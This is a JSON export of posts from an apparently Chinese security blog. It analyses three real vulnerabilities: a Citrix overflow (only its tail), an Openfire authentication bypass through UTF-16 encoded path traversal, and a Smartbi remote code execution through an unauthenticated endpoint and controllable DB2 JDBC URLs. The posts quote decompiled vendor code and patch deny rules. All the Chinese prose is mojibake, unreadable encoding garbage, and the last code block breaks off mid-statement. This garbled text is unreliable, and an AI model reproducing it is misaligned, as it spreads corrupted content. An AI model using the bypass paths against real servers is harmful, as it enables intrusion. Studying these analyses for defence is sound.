çš„popenå‡½æ•°åœ°å€å³å¯ã€‚éœ€è¦æ³¨æ„çš„å°±æ˜¯nsppeå†…å®ç°çš„urlè§£ç é€»è¾‘æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œ å…·ä½“å‚è€ƒå‚è€ƒé“¾æ¥ï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†å±•å¼€äº†ã€‚\nå°ç»“ æ•´ä¸ªæ¼æ´äº§ç”Ÿå’Œåˆ©ç”¨åŸç†ç®€å•ç›´æ¥ï¼Œå› ä¸ºnsppeæ²¡æœ‰å¼€å¯ä»»ä½•æº¢å‡ºé˜²æŠ¤æªæ–½ï¼Œç›´æ¥ä½¿ç”¨jmp espå³å¯ï¼Œè®©æˆ‘æƒ³èµ·äº†è¿™ä¸ªç»å…¸è¡¨æƒ…åŒ… ä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºè¿™ä¸ªå¼•æ“èµ·æºæ¯”è¾ƒä¹…çš„åŸå› ï¼Œnsppeæ²¡æœ‰å»é™¤è°ƒè¯•ç¬¦å·ï¼Œå¯¹äºç†è§£åŸç†å’Œè°ƒè¯•expéƒ½æœ‰éå¸¸å¤§çš„å¸®åŠ©ã€‚\nç”³è¯·å¼€å‘äººå‘˜è®¸å¯\nhttps://blog.assetnote.io/2023/07/24/citrix-rce-part-2-cve-2023-3519/\nCreated at 2023-07-27T10:48:40+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/","title":"CVE-2023-32315 Openfire èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Openfireä¸­å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œé€šè¿‡ä½¿ç”¨UTF-16ç¼–ç çš„../ï¼Œå¯ä»¥ç»•è¿‡èº«ä»½éªŒè¯ï¼Œè®¿é—®ä¸€äº›æ•æ„Ÿæ¥å£ï¼Œé€šè¿‡è¿™äº›æ¥å£å¯ä»¥æ–°å»ºç®¡ç†å‘˜ï¼Œä¸Šä¼ æ’ä»¶ï¼Œè¿›ä¸€æ­¥é€ æˆä»£ç æ‰§è¡Œ\nå½±å“ç‰ˆæœ¬ 3.10.0 \u0026lt;= Openfire \u0026lt; 4.6.8 4.7.0 \u0026lt;= Openfire \u0026lt; 4.7.5\nç¯å¢ƒæ­å»º ç›´æ¥ä¸‹è½½å¯¹åº”çš„exeå®‰è£…å³å¯\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• åœ¨Openfireä¸­ï¼Œ/setup/setup-*å¼€å¤´çš„urlç”±AuthCheckFilterå¤„ç†ï¼Œå¹¶ä¸”è®¿é—®è¯¥urlæ— éœ€ç»è¿‡èº«ä»½éªŒè¯ï¼ˆç™½åå•ï¼‰ï¼Œè¿™ä¸ªFilterå®šä¹‰åœ¨xmppserver/src/main/java/org/jivesoftware/admin/AuthCheckFilter.javaä¸­ã€‚\n\u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;AuthCheck\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.jivesoftware.admin.AuthCheckFilter\u0026lt;/filter-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;excludes\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt; login.jsp,index.jsp?logout=true,setup/index.jsp,setup/setup-*,.gif,.png,error-serverdown.jsp,loginToken.jsp \u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/filter\u0026gt; åœ¨xmppserver/src/main/java/org/jivesoftware/admin/AuthCheckFilter.javaä¸­é€šè¿‡ä»¥ä¸‹ä»£ç åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç›®å½•ç©¿è¶Š\npublic static boolean testURLPassesExclude(String url, String exclude) { // If the exclude rule includes a \u0026#34;?\u0026#34; character, the url must exactly match the exclude rule. // If the exclude rule does not contain the \u0026#34;?\u0026#34; character, we chop off everything starting at the first \u0026#34;?\u0026#34; // in the URL and then the resulting url must exactly match the exclude rule. If the exclude ends with a \u0026#34;*\u0026#34; // character then the URL is allowed if it exactly matches everything before the * and there are no \u0026#34;..\u0026#34; // characters after the \u0026#34;*\u0026#34;. All data in the URL before if (exclude.endsWith(\u0026#34;*\u0026#34;)) { if (url.startsWith(exclude.substring(0, exclude.length()-1))) { // Now make sure that there are no \u0026#34;..\u0026#34; characters in the rest of the URL. if (!url.contains(\u0026#34;..\u0026#34;) \u0026amp;\u0026amp; !url.toLowerCase().contains(\u0026#34;%2e\u0026#34;)) { return true; } } } else if (exclude.contains(\u0026#34;?\u0026#34;)) { if (url.equals(exclude)) { return true; } } else { int paramIndex = url.indexOf(\u0026#34;?\u0026#34;); if (paramIndex != -1) { url = url.substring(0, paramIndex); } if (url.equals(exclude)) { return true; } } return false; } ä½†è¯¥ä»£ç æ²¡æœ‰è€ƒè™‘åˆ°å…¶ä»–å½¢å¼çš„UNICODEç¼–ç ï¼Œè€Œåç«¯å´å¯ä»¥è§£æè¯¥urlï¼Œå¯¼è‡´å¯ä»¥ä½¿ç”¨UTF-16ç¼–ç ç»•è¿‡ç›®å½•ç©¿è¶Šæ£€æŸ¥ï¼Œå¹¶ä¸”ç”±äºå¯ä»¥åŒ¹é…/setup/setup-*ï¼Œä¹Ÿæ— éœ€èº«ä»½éªŒè¯ï¼Œå³æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡èº«ä»½éªŒè¯ï¼Œä»»æ„è®¿é—®åå°ã€‚\næ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ·»åŠ ç®¡ç†å‘˜ï¼Œè€Œåé€šè¿‡ç®¡ç†å‘˜èº«ä»½ä¸Šä¼ æ¶æ„æ’ä»¶ï¼Œé€ æˆä»£ç æ‰§è¡Œã€‚\nç»“æœ\né€šè¿‡è¯¥æ¼æ´æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·\nå‚è€ƒé“¾æ¥\nhttps://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm\nCreated at 2023-06-20T17:42:33+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/","title":"Smartbi RCE åˆ†æ","tags":[],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Smartbiæ˜¯å¹¿å·æ€è¿ˆç‰¹è½¯ä»¶æœ‰é™å…¬å¸æ——ä¸‹çš„å•†ä¸šæ™ºèƒ½BIå’Œæ•°æ®åˆ†æå“ç‰Œï¼Œä¸ºä¼ä¸šå®¢æˆ·æä¾›ä¸€ç«™å¼å•†ä¸šæ™ºèƒ½è§£å†³æ–¹æ¡ˆã€‚Smartbiå¤§æ•°æ®åˆ†æäº§å“èåˆBIå®šä¹‰çš„æ‰€æœ‰é˜¶æ®µï¼Œå¯¹æ¥å„ç§ä¸šåŠ¡æ•°æ®åº“ã€æ•°æ®ä»“åº“å’Œå¤§æ•°æ®åˆ†æå¹³å°ï¼Œè¿›è¡ŒåŠ å·¥å¤„ç†ã€åˆ†ææŒ–æ˜å’Œå¯è§†åŒ–å±•ç°ï¼›æ»¡è¶³æ‰€æœ‰ç”¨æˆ·çš„å„ç§æ•°æ®åˆ†æåº”ç”¨éœ€æ±‚ï¼Œå¦‚å¤§æ•°æ®åˆ†æã€å¯è§†åŒ–åˆ†æã€æ¢ç´¢å¼åˆ†æã€å¤æ‚æŠ¥è¡¨ã€åº”ç”¨åˆ†äº«ç­‰ç­‰ã€‚\nSmartbiå¤§æ•°æ®åˆ†æå¹³å°å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæœªç»èº«ä»½è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨stubæ¥å£æ„é€ è¯·æ±‚ç»•è¿‡è¡¥ä¸é™åˆ¶ï¼Œè¿›è€Œæ§åˆ¶JDBC URLï¼Œæœ€ç»ˆå¯å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæˆ–ä¿¡æ¯æ³„éœ²ã€‚\nå¼•ç”¨è‡ª\rå¥‡å®‰ä¿¡NOX\nå½±å“ç‰ˆæœ¬ V7\u0026lt;= Smartbi \u0026lt;= V10.5.8\nç¯å¢ƒæ­å»º å®˜ç½‘ä¸‹è½½Smartbi V10.5.8å³å¯ï¼Œç›´æ¥å®‰è£…ã€‚\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• è§£åŒ…å®˜ç½‘æä¾›çš„è¡¥ä¸åŒ…ï¼Œå¯ä»¥å‘ç°å¦‚ä¸‹ï¼š\n{ \u0026#34;version\u0026#34;: \u0026#34;1.0\u0026#34;, \u0026#34;date\u0026#34;: \u0026#34;2023-02-28 15:00:00\u0026#34;, \u0026#34;patches\u0026#34;: { \u0026#34;PATCH_20230228\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;ä¿®å¤äº†åˆ©ç”¨stubæ¥å£å¯¹ â€˜DB2 å‘½ä»¤æ‰§è¡Œæ¼æ´â€™ è¡¥ä¸è¿›è¡Œç»•è¿‡çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ (Patch.20230228 @2023-02-28)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;ä¿®å¾©äº†åˆ©ç”¨stubæ¥å£å° â€˜DB2 å‘½ä»¤åŸ·è¡Œæ¼æ´â€™ è£œä¸é€²è¡Œç¹éçš„é ç¨‹å‘½ä»¤åŸ·è¡Œæ¼æ´ (Patch.20230228 @2023-02-28)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Fixed a remote command execution vulnerability in DB2 that used the stub interface (Patch.20230228 @2023-02-28)\u0026#34;, \u0026#34;urls\u0026#34;: [{ \u0026#34;url\u0026#34;: \u0026#34;*.stub\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;RejectStubPostPatchRule\u0026#34; }] }] }, \u0026#34;PATCH_20221122\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;ä¿®å¤äº† DB2 å‘½ä»¤æ‰§è¡Œæ¼æ´ (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;ä¿®å¾©äº† DB2 å‘½ä»¤åŸ·è¡Œæ¼æ´ (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Fixed a DB2 command execution vulnerability. (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;urls\u0026#34;: [{ \u0026#34;url\u0026#34;: \u0026#34;/vision/RMIServlet\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnectionList\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] },{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnection\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] }] }] }, å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¡¥ä¸åŒ…å¯¹ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼*.stub çš„urlè¿›è¡Œäº†å¤„ç†ï¼Œå†æ ¹æ®è¡¥ä¸æè¿°ä¸éš¾å‘ç°å‰ä¸€ä¸ªè¡¥ä¸è¡¥çš„æ¼æ´ï¼šDB2 å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ­¤å¤„çš„æ¼æ´åº”è¯¥æ˜¯å¯¹å…¶è¿›è¡Œäº†ç»•è¿‡ã€‚\nè½¬åˆ°web.xmlé‡Œé¢ï¼Œ*.stubæ˜¯ç”±RMIServletè¿›è¡Œå¤„ç†çš„ï¼Œä¸”åªæœ‰ä¸¤ä¸ªfilterã€‚\n\u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;RMIServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.stub\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CacheFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.stub\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;GZIPFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.stub\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; ç»§ç»­æŸ¥çœ‹web.xmlï¼Œä¸éš¾å‘ç°ä¸€äº›æ•æ„Ÿæ¥å£å‡è¦ç»è¿‡CheckIsLoggedFilterï¼Œç»“åˆåç¼–è¯‘çš„æºç ï¼ŒçŒœæµ‹æ­¤filterä¸ºé‰´æƒfilter\n\u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/ExportServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/ExportHttpServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/DownloadExcelServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/MigrateServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; public class CheckIsLoggedFilter implements javax.servlet.Filter { private static IExtendCustomFilter customFilterChecker; private static final Logger LOG = Logger.getLogger(CheckIsLoggedFilter.class); private static final Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; AUTHORITYMAP = new HashMap(); /* loaded from: smartbi-FreeQuery.jar:smartbi/freequery/filter/CheckIsLoggedFilter$IExtendCustomFilter.class */ public interface IExtendCustomFilter { int authorityFiltering(String str, String str2, HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse); } public void destroy() { } /* JADX WARN: Removed duplicated region for block: B:137:0x060f A[RETURN] */ /* Code decompiled incorrectly, please refer to instructions dump. To view partially-correct code enable \u0026#39;Show inconsistent code\u0026#39; option in preferences */ public void doFilter(javax.servlet.ServletRequest r9, javax.servlet.ServletResponse r10, javax.servlet.FilterChain r11) throws java.io.IOException, javax.servlet.ServletException { /* Method dump skipped, instructions count: 1568 To view this dump change \u0026#39;Code comments level\u0026#39; option to \u0026#39;DEBUG\u0026#39; */ throw new UnsupportedOperationException(\u0026#34;Method not decompiled: smartbi.freequery.filter.CheckIsLoggedFilter.doFilter(javax.servlet.ServletRequest, javax.servlet.ServletResponse, javax.servlet.FilterChain):void\u0026#34;); } public static void handleAutoLogin(HttpServletRequest request) { if (FreeQueryModule.getInstance().getUserManagerModule().isLogged()) { return; } String headerUserName = Bootstrap.getHeaderUserName(request); if (StringUtil.isNullOrEmpty(headerUserName)) { return; } IState state = (IState) request.getSession().getAttribute(\u0026#34;state\u0026#34;); boolean isLogged = (state == null || state.getUser() == null) ? false : true; if (!isLogged) { String headerPassword = Bootstrap.getHeaderPassword(request); if (headerPassword == null) { headerPassword = SmartbiXDataSetUtil.OTHER; } FreeQueryModule.getInstance().getStateModule().doStartRequest(request); boolean isAutoLogin = FreeQueryModule.getInstance().getUserManagerModule().login(headerUserName, headerPassword); if (isAutoLogin) { request.setAttribute(\u0026#34;isNeedAutoLogout\u0026#34;, \u0026#34;true\u0026#34;); } } } è€Œ*.stubå¹¶æœªç»è¿‡è¿™ä¸ªfilterçš„å¤„ç†ï¼Œä¹Ÿå°±æ˜¯æœªæˆæƒå³å¯è®¿é—®ã€‚\nè½¬åˆ°Smartbiçš„RMIServletä¸­æœ‰å¦‚ä¸‹ä»£ç ï¼Œè¿›è¡ŒGETè¯·æ±‚æ—¶ï¼Œæºå¸¦jsonpCallbackå‚æ•°å³å¯è½¬åˆ°doPostæ–¹æ³•ï¼Œè¯¥æ–¹æ³•é€šè¿‡RMIUtil.parseRMIInfoæ–¹æ³•è·å–RMIä¿¡æ¯ï¼Œè·Ÿè¿›ã€‚\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException { String uri = req.getRequestURI(); try { String jsonpCallback = req.getParameter(\u0026#34;jsonpCallback\u0026#34;); if (StringUtil.isNullOrEmpty(jsonpCallback)) { ... } else { doPost(req, resp); } } catch (IOException e) { LOG.error(uri + \u0026#34;\\n\u0026#34; + e.getMessage(), e); } } /* JADX WARN: Finally extract failed */ @Override // smartbi.framework.rmi.IRMIServlet public void doPost(HttpServletRequest request, HttpServletResponse resp) throws ServletException, IOException { RMIModule.getInstance().doStartRequest(request); TraceConfig traceConfig = (TraceConfig) request.getSession().getAttribute(\u0026#34;TraceConfig\u0026#34;); if (this.tracedetail \u0026amp;\u0026amp; traceConfig == null) { traceConfig = new TraceConfig(); request.getSession().setAttribute(\u0026#34;TraceConfig\u0026#34;, traceConfig); } RMIInfo rmiInfo = RMIUtil.parseRMIInfo(request, true); String className = rmiInfo == null ? null : rmiInfo.getClassName(); String methodName = rmiInfo == null ? null : rmiInfo.getMethodName(); String params = rmiInfo == null ? null : rmiInfo.getParams(); ... try { String resultStr = processExecute(request, className, methodName, params); RMIModule.getInstance().doRollback(); RMIModule.getInstance().doEndRequest(request); ... } } catch (Throwable th) { RMIModule.getInstance().doRollback(); RMIModule.getInstance().doEndRequest(request); throw th; } } RMIUtil.parseRMIInfoæ–¹æ³•é¦–å…ˆåˆ¤æ–­uriæ˜¯å¦æ˜¯/vision/RMIServletï¼Œè€Œåè·å–è¯·æ±‚çš„classNameã€methodNameã€paramså‚æ•°ï¼Œå¹¶è¿”å›RMIInfoå¯¹è±¡\npublic static RMIInfo parseRMIInfo(HttpServletRequest request, boolean forceParse) { if (!\u0026#34;/vision/RMIServlet\u0026#34;.equals(request.getServletPath()) \u0026amp;\u0026amp; !forceParse) { return null; } RMIInfo info = getRMIInfoFromRequest(request); if (info != null) { return info; } String className = request.getParameter(\u0026#34;className\u0026#34;); String methodName = request.getParameter(\u0026#34;methodName\u0026#34;); String params = request.getParameter(SimpleReportBO.EL_PARAMS); if (StringUtil.isNullOrEmpty(className) \u0026amp;\u0026amp; StringUtil.isNullOrEmpty(methodName) \u0026amp;\u0026amp; StringUtil.isNullOrEmpty(params) \u0026amp;\u0026amp; request.getContentType() != null \u0026amp;\u0026amp; request.getContentType().startsWith(\u0026#34;multipart/form-data;\u0026#34;)) { DiskFileItemFactory dfif = new DiskFileItemFactory(); ServletFileUpload upload = new ServletFileUpload(dfif); String encodeString = null; try { List\u0026lt;FileItem\u0026gt; fileItems = upload.parseRequest(request); request.setAttribute(ATTR_KEY_UPLOAD_FILE_ITEMS, fileItems); for (FileItem fileItem : fileItems) { if (fileItem.isFormField()) { String itemName = fileItem.getFieldName(); String itemValue = fileItem.getString(\u0026#34;UTF-8\u0026#34;); if (\u0026#34;className\u0026#34;.equals(itemName)) { className = itemValue; } else if (\u0026#34;methodName\u0026#34;.equals(itemName)) { methodName = itemValue; } else if (SimpleReportBO.EL_PARAMS.equals(itemName)) { params = itemValue; } else if (\u0026#34;encode\u0026#34;.equals(itemName)) { encodeString = itemValue; } } } } catch (FileUploadException | UnsupportedEncodingException e) { LOG.error(e.getMessage(), e); } if (!StringUtil.isNullOrEmpty(encodeString)) { String[] decode = (String[]) CodeEntry.decode(encodeString, true); className = decode[0]; methodName = decode[1]; params = decode[2]; } } if (className == null \u0026amp;\u0026amp; methodName == null) { className = (String) request.getAttribute(\u0026#34;className\u0026#34;); methodName = (String) request.getAttribute(\u0026#34;methodName\u0026#34;); params = (String) request.getAttribute(SimpleReportBO.EL_PARAMS); } RMIInfo info2 = new RMIInfo(); info2.setClassName(className); info2.setMethodName(methodName); info2.setParams(params); request.setAttribute(ATTR_KEY_RMI_INFO, info2); return info2; } è€Œåè°ƒç”¨processExecuteæ–¹æ³•ï¼Œæœ€ç»ˆé€šè¿‡exceptionToNodeæ–¹æ³•é€šè¿‡åå°„è°ƒç”¨äº†å¯¹åº”çš„æ–¹æ³•\npublic String processExecute(HttpServletRequest request, String className, String methodName, String params) { Map\u0026lt;Integer, Integer\u0026gt; map; ClientService service = RMIModule.getInstance().getService(className); ClientService operationFailLogService = RMIModule.getInstance().getService(\u0026#34;OperationLogService\u0026#34;); String resultStr = null; JSONArray jsonParams = null; try { } catch (Exception ce) { if (Framework.getInstance().getExceptionHandler() != null) { return Framework.getInstance().getExceptionHandler().processException(ce); } if (className != null \u0026amp;\u0026amp; methodName != null) { try { ObjectNode resultNode = exceptionToNode(className, methodName, ce); resultStr = resultNode.toString(); String failResult = resultNode.has(\u0026#34;detail\u0026#34;) ? resultNode.get(\u0026#34;detail\u0026#34;).asText((String) null) : null; if (StringUtil.isNullOrEmpty(failResult)) { failResult = resultNode.get(\u0026#34;result\u0026#34;).asText(); } List\u0026lt;Object\u0026gt; listParams = null; if (0 != 0) { listParams = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; jsonParams.length(); i++) { listParams.add(jsonParams.get(i)); } } Object[] objParams = {className, methodName, listParams, failResult}; operationFailLogService.executeInternal(\u0026#34;addOperationFailLog\u0026#34;, objParams); } catch (Exception e) { LOG.error(e.getMessage(), e); } } } public Object executeInternal(String methodName, Object[] objParams) { try { Method method = StringUtil.isNullOrEmpty(methodName) ? null : this.methodList.get(methodName); if (method == null) { throw new SmartbiException(CommonErrorCode.METHOD_NAME_ERROR).setDetail(StringUtil.replaceHTML(methodName)); } Object result = method.invoke(this.module, objParams); return result; } catch (InvocationTargetException ex) { if (ex.getCause() instanceof SmartbiException) { å†æ¥å›é¡¾ä¸€ä¸‹è¡¥ä¸ï¼Œè¡¥ä¸ä¸­è¯´è¯¥æ¼æ´æ˜¯å¯¹é’±ä¸€ä¸ªæ¼æ´çš„ç»•è¿‡ï¼Œç»è¿‡ä¸Šé¢çš„åˆ†æå¯çŸ¥*.stubæ¥å£æ— éœ€èº«ä»½éªŒè¯ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡*.stubæ¥å£åˆ©ç”¨Smartbiå†…çš„åå°„è°ƒç”¨åˆ°å­˜åœ¨æ¼æ´çš„ç±»ã€‚\nåœ¨è¡¥ä¸ä¸­æœ‰å¦‚ä¸‹ï¼Œé€šè¿‡å…¨å±€æœç´¢ç±»åDataSourceServiceä¾¿å¯çŸ¥é“æ¼æ´ä»£ç ã€‚\n\u0026#34;PATCH_20221122\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;ä¿®å¤äº† DB2 å‘½ä»¤æ‰§è¡Œæ¼æ´ (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;ä¿®å¾©äº† DB2 å‘½ä»¤åŸ·è¡Œæ¼æ´ (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Fixed a DB2 command execution vulnerability. (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;urls\u0026#34;: [{ \u0026#34;url\u0026#34;: \u0026#34;/vision/RMIServlet\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnectionList\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] },{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnection\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] }] }] }, è¯¥ä»£ç ä¸­çš„å‚æ•°å‡ä¸ºå¯æ§ï¼Œæ•…å¯ä»¥é€šè¿‡æ§åˆ¶JDBC urlçš„æ–¹å¼æ‰§è¡Œæ¶æ„ä»£ç ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡DB2æ‰§è¡Œä»£ç ã€‚\npublic void testConnectionList(List\u0026lt;IDataSource\u0026gt; list) { for (IDataSource dataSource : list) { MetaDataServiceImpl.getInstance().testConnection(dataSource); } } public void testConnection(IDataSource dataSource) { int preIndex; ISystemConfig systemConfig; DataSource ds = new DataSource(); String url = dataSource.getUrl(); ds.setId(UUIDGenerator.generate()); ds.setName(dataSource.getName()); ds.setAlias(dataSource.getAlias()); ds.setDriver(dataSource.getDriver()); ds.setDesc(dataSource.getDesc()); ds.setDbCharset(dataSource.getDbCharset()); ds.setUrl(url); ds.setUser(dataSource.getUser()); ds.setDriverType(dataSource.getDriverType()); ds.setMaxConnection(dataSource.getMaxConnection()); ds.setValidationQuery(dataSource.getValidationQuery()); ds.setPassword(dataSource.getPassword()); ds.setTransactionIsolation(dataSource.getTransactionIsolation()); ds.setValidationQueryMethod(dataSource.getValidationQueryMethod()); ds.setAuthenticationType(dataSource.getAuthenticationType()); ds.setExtendProp(dataSource.getExtendProp()); ds.setDriverCatalog(dataSource.getDriverCatalog()); if (dataSource.getPassword() == null \u0026amp;\u0026amp; !StringUtil.isNullOrEmpty(dataSource.getId())) { DataSource dbDs = loadDataSource(dataSource.getId()); ds.setPassword(dbDs.getPassword()); } if (StringUtil.isNullOrEmpty(dataSource.getId()) \u0026amp;\u0026amp; ds.getDriverType() == DBType.HADOOP_HIVE \u0026amp;\u0026amp; (systemConfig = FreeQueryModule.getInstance().getSystemConfigService().getSystemConfig(\u0026#34;MPP_SSH_CONFIG\u0026#34;)) != null) { String longValue = systemConfig.getLongValue(); if (StringUtils.isNotBlank(longValue)) { JSONObject jsonObject = JSONObject.fromString(longValue); if (jsonObject.has(SFTPConstants.HIVE_PASSWORD)) { String pwd = jsonObject.getString(SFTPConstants.HIVE_PASSWORD); if (StringUtils.isNotBlank(pwd)) { ds.setPassword(pwd); } } } } Connection conn = null; try { try { conn = ConnectionPool.getInstance().getConnection(ds); if (conn == null) { throw new SmartbiException(CommonErrorCode.JDBC_DRIVER_ERROR).setDetail(ds.getDriver() + \u0026#34;:\u0026#34; + ds.getUrl()); } if (DBType.PRESTO == dataSource.getDriverType()) { PreparedStatement stat = JdbcUtil.prepareStatement(conn, \u0026#34;SELECT 1\u0026#34;, dataSource.getDriverType()); try { PreparedStatementWarp.executeQuery(stat, DBSQLUtil.createSQLLog(ds.getAlias(), SmartbiXDataSetUtil.OTHER, FreeQueryModule.getInstance().getStateModule(), \u0026#34;SELECT 1\u0026#34;)); } catch (Exception e) { if (e instanceof SmartbiException) { throw ((SmartbiException) e); } throw new SmartbiException(FreeQueryErrorCode.CONNECTION_POOL_NOT_INITIAL, e).setDetail(StringUtil.getLanguageValue(\u0026#34;InvalidConnection\u0026#34;)); } } else if (DBType.CLICK_HOUSE == dataSource.getDriverType() \u0026amp;\u0026amp; (preIndex = url.indexOf(\u0026#34;clusterName=\u0026#34;)) \u0026gt; -1) { String clusterName = url.substring(preIndex + \u0026#34;clusterName=\u0026#34;.length()); int suffixIndex = clusterName.indexOf(\u0026#34;\u0026amp;\u0026#34;); if (suffixIndex \u0026gt; -1) { clusterName = clusterName.substring(0, suffixIndex); } if (!StringUtil.isNullOrEmpty(clusterName)) { String validSql = \u0026#34;drop table if exists t_testcluster on cluster \u0026#34; + clusterName; PreparedStatement stat2 = JdbcUtil.prepareStatement(conn, validSql, dataSource.getDriverType()); try { PreparedStatementWarp.executeQuery(stat2, DBSQLUtil.createSQLLog(ds.getAlias(), SmartbiXDataSetUtil.OTHER, FreeQueryModule.getInstance().getStateModule(), validSql)); } catch (Exception e2) { if (e2.getLocalizedMessage().indexOf(\u0026#34;Requested cluster \u0026#39;\u0026#34; + clusterName + \u0026#34;\u0026#39; not found\u0026#34;) \u0026gt; -1) { throw new SmartbiException(CommonErrorCode.CLICK_HOUSE_CLUSTER_NOT_FOUND, e2).setDetail(clusterName); } if (e2 instanceof SmartbiException) { throw ((SmartbiException) e2); } throw new SmartbiException(FreeQueryErrorCode.CONNECTION_POOL_NOT_INITIAL, e2).setDetail(StringUtil.getLanguageValue(\u0026#34;InvalidConnection\u0026#34;)); } } } } catch (Exception e3) { if (e3 instanceof SmartbiException) { throw ((SmartbiException) e3); } String detail = SmartbiXDataSetUtil.OTHER; if (e3 instanceof ClassNotFoundException) { detail = StringUtil.getLanguageValue(\u0026#34;DBDriverNoFound\u0026#34;); } throw new SmartbiException(FreeQueryErrorCode.CONNECTION_POOL_NOT_INITIAL, 